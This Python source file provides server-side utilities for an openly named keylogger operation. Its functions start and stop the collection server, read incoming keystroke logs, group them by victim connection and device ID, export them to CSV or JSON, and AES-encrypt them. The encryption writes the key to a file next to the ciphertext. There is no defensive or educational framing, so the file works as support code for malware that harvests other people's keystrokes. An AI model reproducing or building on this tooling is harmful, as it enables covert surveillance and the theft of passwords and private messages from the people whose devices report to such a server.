"""
Utility Functions for Keylogger Server Manager
"""

import os
import csv
import json
import re
import datetime
import subprocess
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from typing import Optional, Tuple, List, Dict


# ==================== SERVER MANAGEMENT ====================

def start_server(server_script: str) -> Tuple[Optional[subprocess.Popen], bool, Optional[str]]:
    """Start the server process."""
    try:
        process = subprocess.Popen(["python", server_script])
        return process, True, None
    except Exception as e:
        return None, False, str(e)


def stop_server(process: subprocess.Popen) -> Tuple[bool, Optional[str]]:
    """Stop the server process."""
    try:
        process.terminate()
        process.wait(timeout=5)
        return True, None
    except Exception as e:
        return False, str(e)


def get_uptime(start_time: datetime.datetime) -> str:
    """Get formatted uptime string."""
    if not start_time:
        return "00:00:00"
    
    elapsed = datetime.datetime.now() - start_time
    hours, remainder = divmod(int(elapsed.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{hours:02}:{minutes:02}:{seconds:02}"


# ==================== LOG READING ====================

def read_new_logs(log_file: str, last_size: int) -> Tuple[Optional[str], int]:
    """Read new content from log file."""
    if not os.path.exists(log_file):
        return None, last_size
    
    try:
        with open(log_file, "r", errors="ignore") as f:
            content = f.read()
        
        new_content = content[last_size:]
        return new_content if new_content else None, len(content)
    except:
        return None, last_size


def get_log_count(log_file: str) -> int:
    """Get number of lines in log file."""
    if not os.path.exists(log_file):
        return 0
    
    try:
        with open(log_file, "r", errors="ignore") as f:
            return f.read().count('\n')
    except:
        return 0


def clear_logs(log_file: str) -> Tuple[bool, Optional[str]]:
    """Clear the log file."""
    try:
        open(log_file, 'w').close()
        return True, None
    except Exception as e:
        return False, str(e)


# ==================== LOG PARSING ====================

def parse_log_entry(line: str) -> Optional[Tuple[str, str, str]]:
    """Parse a log entry line."""
    try:
        match = re.match(r'\["([^"]+)", "([^"]+)", "(.+)"\]', line)
        if match:
            return match.group(1), match.group(2), match.group(3)
    except:
        pass
    return None


def parse_logs_for_csv(content: str) -> List[Tuple[str, str, str, str]]:
    """Parse logs into rows for CSV."""
    rows = []
    current_connection = ""
    
    for line in content.split('\n'):
        line = line.strip()
        
        if line.startswith('[Connection from'):
            current_connection = line
        elif line.startswith('["'):
            log_data = parse_log_entry(line)
            if log_data:
                rows.append((current_connection, log_data[0], log_data[1], log_data[2]))
    
    return rows


def parse_logs_for_json(content: str) -> List[Dict]:
    """Parse logs into sessions for JSON."""
    sessions = []
    current_session = None
    
    for line in content.split('\n'):
        line = line.strip()
        
        if line.startswith('[Connection from'):
            if current_session:
                sessions.append(current_session)
            current_session = {"connection_info": line, "logs": []}
        elif line.startswith('["'):
            log_data = parse_log_entry(line)
            if log_data:
                entry = {"device_id": log_data[0], "timestamp": log_data[1], "message": log_data[2]}
                if current_session:
                    current_session["logs"].append(entry)
                else:
                    current_session = {"connection_info": "Unknown", "logs": [entry]}
    
    if current_session:
        sessions.append(current_session)
    
    return sessions


# ==================== EXPORT FUNCTIONS ====================

def export_to_txt(content: str, output_path: str) -> Tuple[bool, Optional[str]]:
    """Export to text file."""
    try:
        with open(output_path, "w", encoding="utf-8") as f:
            f.write(content)
        return True, None
    except Exception as e:
        return False, str(e)


def export_to_csv(rows: List[Tuple], output_path: str) -> Tuple[bool, Optional[str]]:
    """Export to CSV file."""
    try:
        with open(output_path, "w", newline='', encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow(["Connection Info", "Device ID", "Timestamp", "Log Entry"])
            writer.writerows(rows)
        return True, None
    except Exception as e:
        return False, str(e)


def export_to_json(sessions: List[Dict], output_path: str) -> Tuple[bool, Optional[str]]:
    """Export to JSON file."""
    try:
        data = {
            "exported_at": datetime.datetime.now().isoformat(),
            "total_sessions": len(sessions),
            "sessions": sessions
        }
        with open(output_path, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)
        return True, None
    except Exception as e:
        return False, str(e)


# ==================== ENCRYPTION ====================

def encrypt_logs(log_file: str) -> Tuple[bool, Optional[str]]:
    """Encrypt log file with AES-256."""
    if not os.path.exists(log_file):
        return False, "Log file not found"
    
    try:
        key = get_random_bytes(32)
        cipher = AES.new(key, AES.MODE_EAX)
        
        with open(log_file, "rb") as f:
            data = f.read()
        
        ciphertext, tag = cipher.encrypt_and_digest(data)
        
        with open("logs.enc", "wb") as f:
            f.write(cipher.nonce + tag + ciphertext)
        
        with open("logs.key", "wb") as f:
            f.write(key)
        
        return True, None
    except Exception as e:
        return False, str(e)